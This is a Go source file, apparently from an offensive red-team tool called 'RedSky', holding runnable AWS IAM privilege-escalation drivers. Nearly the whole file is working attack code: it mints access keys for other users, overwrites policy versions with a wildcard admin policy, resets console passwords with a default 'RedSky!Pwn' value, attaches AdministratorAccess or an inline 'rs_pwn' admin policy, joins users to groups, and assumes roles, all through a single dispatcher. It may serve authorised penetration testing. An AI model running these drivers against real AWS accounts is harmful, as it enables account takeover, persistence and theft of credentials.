package cloudgo

import (
	"encoding/xml"
	"fmt"
	"net/http"
	"net/url"
	"time"
)

// Runnable IAM privilege-escalation drivers. Each corresponds to a Python
// driver in Program/cloud/privesc.py and shares the API shape.
//
// All calls go to iam.amazonaws.com via the SigV4 signer in iam.go.

// AdminPolicy is the full-admin policy document that the drivers install
// when the escalation is "make this principal admin".
const AdminPolicy = `{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}`

// adminPolicyURLEncoded returns AdminPolicy URL-encoded for query-string use.
func adminPolicyURLEncoded() string {
	return url.QueryEscape(AdminPolicy)
}

// CreateAccessKeyResponse is the parsed XML for iam:CreateAccessKey.
type AccessKey struct {
	UserName        string
	AccessKeyID     string
	SecretAccessKey string
	Status          string
	CreateDate      string
}

type createAccessKeyResp struct {
	XMLName xml.Name `xml:"CreateAccessKeyResponse"`
	Result  struct {
		AccessKey struct {
			UserName        string `xml:"UserName"`
			AccessKeyID     string `xml:"AccessKeyId"`
			SecretAccessKey string `xml:"SecretAccessKey"`
			Status          string `xml:"Status"`
			CreateDate      string `xml:"CreateDate"`
		} `xml:"AccessKey"`
	} `xml:"CreateAccessKeyResult"`
}

// CreateAccessKey mints a new access key for targetUser. Requires
// iam:CreateAccessKey on the caller.
func CreateAccessKey(key AWSKey, targetUser string) (AccessKey, error) {
	vals := url.Values{}
	vals.Set("Action", "CreateAccessKey")
	vals.Set("Version", "2010-05-08")
	vals.Set("UserName", targetUser)
	code, body, err := awsCall(key, "iam.amazonaws.com", http.MethodPost, "/", nil, []byte(vals.Encode()))
	if err != nil {
		return AccessKey{}, fmt.Errorf("cloudgo: create-access-key: %w", err)
	}
	if code != 200 {
		return AccessKey{}, fmt.Errorf("cloudgo: create-access-key %d: %s", code, string(body[:min(len(body), 300)]))
	}
	var r createAccessKeyResp
	if err := xml.Unmarshal(body, &r); err != nil {
		return AccessKey{}, fmt.Errorf("cloudgo: parse: %w", err)
	}
	ak := r.Result.AccessKey
	return AccessKey{
		UserName:        ak.UserName,
		AccessKeyID:     ak.AccessKeyID,
		SecretAccessKey: ak.SecretAccessKey,
		Status:          ak.Status,
		CreateDate:      ak.CreateDate,
	}, nil
}

// CreatePolicyVersion overwrites policyArn with a full-admin version and
// sets it as default. Requires iam:CreatePolicyVersion.
func CreatePolicyVersion(key AWSKey, policyArn string, setDefault bool) (string, error) {
	vals := url.Values{}
	vals.Set("Action", "CreatePolicyVersion")
	vals.Set("Version", "2010-05-08")
	vals.Set("PolicyArn", policyArn)
	vals.Set("PolicyDocument", AdminPolicy)
	vals.Set("SetAsDefault", fmt.Sprintf("%t", setDefault))
	code, body, err := awsCall(key, "iam.amazonaws.com", http.MethodPost, "/", nil, []byte(vals.Encode()))
	if err != nil {
		return "", fmt.Errorf("cloudgo: create-policy-version: %w", err)
	}
	if code != 200 {
		return "", fmt.Errorf("cloudgo: create-policy-version %d: %s", code, string(body[:min(len(body), 300)]))
	}
	return string(body), nil
}

// SetDefaultPolicyVersion switches the default version of a policy.
// Requires iam:SetDefaultPolicyVersion.
func SetDefaultPolicyVersion(key AWSKey, policyArn, versionID string) error {
	vals := url.Values{}
	vals.Set("Action", "SetDefaultPolicyVersion")
	vals.Set("Version", "2010-05-08")
	vals.Set("PolicyArn", policyArn)
	vals.Set("VersionId", versionID)
	code, body, err := awsCall(key, "iam.amazonaws.com", http.MethodPost, "/", nil, []byte(vals.Encode()))
	if err != nil {
		return fmt.Errorf("cloudgo: set-default-policy-version: %w", err)
	}
	if code != 200 {
		return fmt.Errorf("cloudgo: set-default-policy-version %d: %s", code, string(body[:min(len(body), 300)]))
	}
	return nil
}

// UpdateLoginProfile sets the console password for targetUser. Falls back
// to CreateLoginProfile if no profile exists. Requires iam:UpdateLoginProfile
// or iam:CreateLoginProfile.
func UpdateLoginProfile(key AWSKey, targetUser, newPassword string) (string, error) {
	// try update first
	vals := url.Values{}
	vals.Set("Action", "UpdateLoginProfile")
	vals.Set("Version", "2010-05-08")
	vals.Set("UserName", targetUser)
	vals.Set("Password", newPassword)
	vals.Set("PasswordResetRequired", "false")
	code, body, err := awsCall(key, "iam.amazonaws.com", http.MethodPost, "/", nil, []byte(vals.Encode()))
	if err == nil && code == 200 {
		return "updated", nil
	}
	// fallback: create
	vals.Set("Action", "CreateLoginProfile")
	code, body, err = awsCall(key, "iam.amazonaws.com", http.MethodPost, "/", nil, []byte(vals.Encode()))
	if err != nil {
		return "", fmt.Errorf("cloudgo: create-login-profile: %w", err)
	}
	if code != 200 {
		return "", fmt.Errorf("cloudgo: create-login-profile %d: %s", code, string(body[:min(len(body), 300)]))
	}
	return "created", nil
}

// AttachUserPolicy attaches a managed policy ARN to targetUser. Requires
// iam:AttachUserPolicy.
func AttachUserPolicy(key AWSKey, targetUser, policyArn string) error {
	vals := url.Values{}
	vals.Set("Action", "AttachUserPolicy")
	vals.Set("Version", "2010-05-08")
	vals.Set("UserName", targetUser)
	vals.Set("PolicyArn", policyArn)
	code, body, err := awsCall(key, "iam.amazonaws.com", http.MethodPost, "/", nil, []byte(vals.Encode()))
	if err != nil {
		return fmt.Errorf("cloudgo: attach-user-policy: %w", err)
	}
	if code != 200 {
		return fmt.Errorf("cloudgo: attach-user-policy %d: %s", code, string(body[:min(len(body), 300)]))
	}
	return nil
}

// PutUserPolicy installs an inline full-admin policy on targetUser.
// Requires iam:PutUserPolicy.
func PutUserPolicy(key AWSKey, targetUser, policyName string) error {
	vals := url.Values{}
	vals.Set("Action", "PutUserPolicy")
	vals.Set("Version", "2010-05-08")
	vals.Set("UserName", targetUser)
	vals.Set("PolicyName", policyName)
	vals.Set("PolicyDocument", AdminPolicy)
	code, body, err := awsCall(key, "iam.amazonaws.com", http.MethodPost, "/", nil, []byte(vals.Encode()))
	if err != nil {
		return fmt.Errorf("cloudgo: put-user-policy: %w", err)
	}
	if code != 200 {
		return fmt.Errorf("cloudgo: put-user-policy %d: %s", code, string(body[:min(len(body), 300)]))
	}
	return nil
}

// AddUserToGroup joins targetUser to group. Requires iam:AddUserToGroup.
func AddUserToGroup(key AWSKey, targetUser, group string) error {
	vals := url.Values{}
	vals.Set("Action", "AddUserToGroup")
	vals.Set("Version", "2010-05-08")
	vals.Set("UserName", targetUser)
	vals.Set("GroupName", group)
	code, body, err := awsCall(key, "iam.amazonaws.com", http.MethodPost, "/", nil, []byte(vals.Encode()))
	if err != nil {
		return fmt.Errorf("cloudgo: add-user-to-group: %w", err)
	}
	if code != 200 {
		return fmt.Errorf("cloudgo: add-user-to-group %d: %s", code, string(body[:min(len(body), 300)]))
	}
	return nil
}

// AssumeRoleResult holds the temp creds from sts:AssumeRole.
type AssumeRoleResult struct {
	AccessKeyID     string
	SecretAccessKey string
	SessionToken    string
	Expiration      string
}

type assumeRoleResp struct {
	XMLName xml.Name `xml:"AssumeRoleResponse"`
	Result  struct {
		Credentials struct {
			AccessKeyID     string `xml:"AccessKeyId"`
			SecretAccessKey string `xml:"SecretAccessKey"`
			SessionToken    string `xml:"SessionToken"`
			Expiration      string `xml:"Expiration"`
		} `xml:"Credentials"`
	} `xml:"AssumeRoleResult"`
}

// AssumeRole calls sts:AssumeRole to obtain short-lived credentials for
// roleArn. sessionName should be short and alphanumeric.
func AssumeRole(key AWSKey, roleArn, sessionName string, durationSecs int) (AssumeRoleResult, error) {
	if sessionName == "" {
		sessionName = "redsky"
	}
	if durationSecs == 0 {
		durationSecs = 3600
	}
	vals := url.Values{}
	vals.Set("Action", "AssumeRole")
	vals.Set("Version", "2011-06-15")
	vals.Set("RoleArn", roleArn)
	vals.Set("RoleSessionName", sessionName)
	vals.Set("DurationSeconds", fmt.Sprintf("%d", durationSecs))
	code, body, err := awsCall(key, "sts.amazonaws.com", http.MethodPost, "/", nil, []byte(vals.Encode()))
	if err != nil {
		return AssumeRoleResult{}, fmt.Errorf("cloudgo: assume-role: %w", err)
	}
	if code != 200 {
		return AssumeRoleResult{}, fmt.Errorf("cloudgo: assume-role %d: %s", code, string(body[:min(len(body), 300)]))
	}
	var r assumeRoleResp
	if err := xml.Unmarshal(body, &r); err != nil {
		return AssumeRoleResult{}, fmt.Errorf("cloudgo: parse assume-role: %w", err)
	}
	c := r.Result.Credentials
	return AssumeRoleResult{
		AccessKeyID:     c.AccessKeyID,
		SecretAccessKey: c.SecretAccessKey,
		SessionToken:    c.SessionToken,
		Expiration:      c.Expiration,
	}, nil
}

// DriverName constants identify the runnable drivers for the proto layer.
const (
	DriverCreateAccessKey     = "create_access_key"
	DriverCreatePolicyVersion = "create_policy_version"
	DriverSetDefaultPolicy    = "set_default_policy"
	DriverUpdateLoginProfile  = "update_login_profile"
	DriverAttachUserPolicy    = "attach_user_policy"
	DriverPutUserPolicy       = "put_user_policy"
	DriverAddUserToGroup      = "add_user_to_group"
	DriverAssumeRole          = "assume_role"
)

// ApplyDriver dispatches by name against the target AWS account, using the
// supplied AWSKey. Extra fields are pulled from opts by driver semantics.
type DriverOptions struct {
	TargetUser   string
	TargetGroup  string
	PolicyARN    string
	VersionID    string
	RoleARN      string
	SessionName  string
	Password     string
	PolicyName   string
	DurationSecs int
}

// ApplyDriver runs the named privesc driver. Returns a human-readable
// summary on success or an error.
func ApplyDriver(key AWSKey, driver string, opts DriverOptions) (string, error) {
	switch driver {
	case DriverCreateAccessKey:
		ak, err := CreateAccessKey(key, opts.TargetUser)
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("AccessKeyId=%s SecretAccessKey=%s", ak.AccessKeyID, ak.SecretAccessKey), nil
	case DriverCreatePolicyVersion:
		body, err := CreatePolicyVersion(key, opts.PolicyARN, true)
		if err != nil {
			return "", err
		}
		return "created default version for " + opts.PolicyARN + " (" + fmt.Sprint(len(body)) + " bytes resp)", nil
	case DriverSetDefaultPolicy:
		if err := SetDefaultPolicyVersion(key, opts.PolicyARN, opts.VersionID); err != nil {
			return "", err
		}
		return "default version " + opts.VersionID + " applied to " + opts.PolicyARN, nil
	case DriverUpdateLoginProfile:
		pw := opts.Password
		if pw == "" {
			pw = "RedSky!Pwn" + fmt.Sprint(time.Now().Unix()%100000)
		}
		res, err := UpdateLoginProfile(key, opts.TargetUser, pw)
		if err != nil {
			return "", err
		}
		return res + " login profile for " + opts.TargetUser + " with password " + pw, nil
	case DriverAttachUserPolicy:
		arn := opts.PolicyARN
		if arn == "" {
			arn = "arn:aws:iam::aws:policy/AdministratorAccess"
		}
		if err := AttachUserPolicy(key, opts.TargetUser, arn); err != nil {
			return "", err
		}
		return "attached " + arn + " to " + opts.TargetUser, nil
	case DriverPutUserPolicy:
		name := opts.PolicyName
		if name == "" {
			name = "rs_pwn"
		}
		if err := PutUserPolicy(key, opts.TargetUser, name); err != nil {
			return "", err
		}
		return "inline admin policy " + name + " installed on " + opts.TargetUser, nil
	case DriverAddUserToGroup:
		if err := AddUserToGroup(key, opts.TargetUser, opts.TargetGroup); err != nil {
			return "", err
		}
		return opts.TargetUser + " added to " + opts.TargetGroup, nil
	case DriverAssumeRole:
		res, err := AssumeRole(key, opts.RoleARN, opts.SessionName, opts.DurationSecs)
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("assumed %s: AccessKeyId=%s Expiration=%s", opts.RoleARN, res.AccessKeyID, res.Expiration), nil
	default:
		return "", fmt.Errorf("cloudgo: unknown driver %q", driver)
	}
}
